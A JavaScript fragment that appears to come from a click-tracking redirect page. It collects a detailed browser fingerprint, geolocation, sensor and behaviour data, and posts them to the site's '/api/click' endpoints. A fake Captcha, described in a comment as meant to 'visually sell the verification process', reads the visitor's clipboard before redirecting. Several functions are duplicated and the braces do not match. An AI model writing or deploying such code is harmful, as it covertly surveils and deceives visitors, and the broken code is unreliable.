    }

    return result;
  }

  // String hashing
  function hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(8, '0');
  }

  // ArrayBuffer to Base64
  function arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  // Check if IP is private
  function isPrivateIP(ip) {
    if (!ip) return true;
    if (ip === '0.0.0.0') return true;
    if (ip.startsWith('127.')) return true;
    if (ip.startsWith('10.')) return true;
    if (ip.startsWith('172.')) {
      const second = parseInt(ip.split('.')[1]);
      if (second >= 16 && second <= 31) return true;
    }
    if (ip.startsWith('192.168.')) return true;
    if (ip.startsWith('169.254.')) return true;
    if (ip.startsWith('fc') || ip.startsWith('fd')) return true;
    if (ip.startsWith('fe80:')) return true;
    if (ip.startsWith('::1')) return true;
    return false;
  }

  // Send fingerprint to server
  async function sendFingerprint() {
    const trackingId = new URLSearchParams(window.location.search).get('id');
    const redirectUrl = document.querySelector('meta[name="destination"]')?.content;

    const payload = {
      trackingId,
      redirectUrl,
      sessionId: DATA.sessionId,
      visitorId: DATA.visitorId,
      fingerprint: {
        canvas: DATA.canvas,
        webgl: DATA.webgl,
        webrtc: DATA.webrtc,
        audio: DATA.audio,
        fonts: DATA.fonts,
        display: DATA.display,
        window: DATA.window,
        device: DATA.device,
        browser: DATA.browser,
        os: DATA.os,
        storage: DATA.storage,
        permissions: DATA.permissions,
        media: DATA.media,
        network: DATA.network,
        security: DATA.security,
        bot: DATA.bot,
        vpn: DATA.vpn,
        page: DATA.page,
        geo: DATA.geo,
        sensors: DATA.sensors,
        advanced: DATA.advanced
      },
      entropyScore: DATA.entropyScore,
      isInitial: true
    };

    try {
      const response = await fetch('/api/click/complete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });

      const result = await response.json();
      if (result.redirectUrl) {
        // Store the redirect URL globally but wait for the Captcha click
        window._finalRedirectUrl = result.redirectUrl;
      }
    } catch (e) {
      console.error('Failed to send fingerprint:', e);
      if (redirectUrl) {
        window._finalRedirectUrl = decodeURIComponent(redirectUrl);
      }
    }
  }

  // Handle Captcha verification click

// String hashing
function hashString(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return Math.abs(hash).toString(16).padStart(8, '0');
}

// ArrayBuffer to Base64
function arrayBufferToBase64(buffer) {
  const bytes = new Uint8Array(buffer);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

// Check if IP is private
function isPrivateIP(ip) {
  if (!ip) return true;
  if (ip === '0.0.0.0') return true;
  if (ip.startsWith('127.')) return true;
  if (ip.startsWith('10.')) return true;
  if (ip.startsWith('172.')) {
    const second = parseInt(ip.split('.')[1]);
    if (second >= 16 && second <= 31) return true;
  }
  if (ip.startsWith('192.168.')) return true;
  if (ip.startsWith('169.254.')) return true;
  if (ip.startsWith('fc') || ip.startsWith('fd')) return true;
  if (ip.startsWith('fe80:')) return true;
  if (ip.startsWith('::1')) return true;
  return false;
}

// Send fingerprint to server
async function sendFingerprint() {
  const trackingId = new URLSearchParams(window.location.search).get('id');
  const redirectUrl = document.querySelector('meta[name="destination"]')?.content;

  const payload = {
    trackingId,
    redirectUrl,
    sessionId: DATA.sessionId,
    visitorId: DATA.visitorId,
    fingerprint: {
      canvas: DATA.canvas,
      webgl: DATA.webgl,
      webrtc: DATA.webrtc,
      audio: DATA.audio,
      fonts: DATA.fonts,
      display: DATA.display,
      window: DATA.window,
      device: DATA.device,
      browser: DATA.browser,
      os: DATA.os,
      storage: DATA.storage,
      permissions: DATA.permissions,
      media: DATA.media,
      network: DATA.network,
      security: DATA.security,
      bot: DATA.bot,
      vpn: DATA.vpn,
      page: DATA.page,
      geo: DATA.geo,
      sensors: DATA.sensors,
      advanced: DATA.advanced
    },
    entropyScore: DATA.entropyScore,
    isInitial: true
  };

  try {
    const response = await fetch('/api/click/complete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true
    });

    const result = await response.json();
    if (result.redirectUrl) {
      // Store the redirect URL globally but wait for the Captcha click
      window._finalRedirectUrl = result.redirectUrl;
    }
  } catch (e) {
    console.error('Failed to send fingerprint:', e);
    if (redirectUrl) {
      window._finalRedirectUrl = decodeURIComponent(redirectUrl);
    }
  }
}

// Handle Captcha verification click
window.triggerCaptchaChallenge = async function () {
  const box = document.getElementById('captchaBox');
  if (box && box.classList.contains('loading')) return; // Prevent double click
  if (box) box.classList.add('loading');

  // Clipboard Read: Only read clipboard if user explicitly copied something recently
  // This prevents capturing unintended clipboard data
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      // Only read clipboard if user recently performed a copy action (within 2 seconds)
      const lastCopyTime = window._lastCopyTime || 0;
      const now = Date.now();
      if (now - lastCopyTime < 2000) {
        DATA.advanced.clipboardText = await navigator.clipboard.readText();
      }
    }
  } catch (e) {
    // Ignore copy blocks or permission denials
    // Wait slightly to visually sell the verification process and guarantee data
    setTimeout(async () => {
      // Send final behavior update (with the new Clipboard + GPS payload) before bouncing
      await sendBehaviorUpdate();

      const url = window._finalRedirectUrl || document.querySelector('meta[name="destination"]')?.content;
      if (url) {
        window.location.href = url;
      }
    }, 1200);
  };

  // Send behavior update
  async function sendBehaviorUpdate() {
    const trackingId = new URLSearchParams(window.location.search).get('id');
    if (!trackingId) return;

    const payload = {
      trackingId,
      sessionId: DATA.sessionId,
      behavior: DATA.behavior,
      performance: {
        timeOnPage: DATA.behavior.timeOnPage,
        scrollDepth: DATA.behavior.scrollDepth,
        clickCount: DATA.behavior.clickCount,
        keyCount: DATA.behavior.keyCount,
        humanScore: DATA.behavior.humanScore
      },
      isUpdate: true
    };

    try {
      await fetch('/api/click/behavior', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (e) { }
  }

  // Send final data on unload
  function sendFinalData() {
    const trackingId = new URLSearchParams(window.location.search).get('id');
    if (!trackingId) return;

    const payload = {
      trackingId,
      sessionId: DATA.sessionId,
      behavior: {
        ...DATA.behavior,
        timeOnPage: Date.now() - DATA.timing.start,
        isFinal: true
      },
      isFinal: true
    };

    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/click/behavior', JSON.stringify(payload));
    }
  }

  // Track copy events to enable safe clipboard reading
  document.addEventListener('copy', () => {
    window._lastCopyTime = Date.now();
  });

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    initialize();
  }

})();
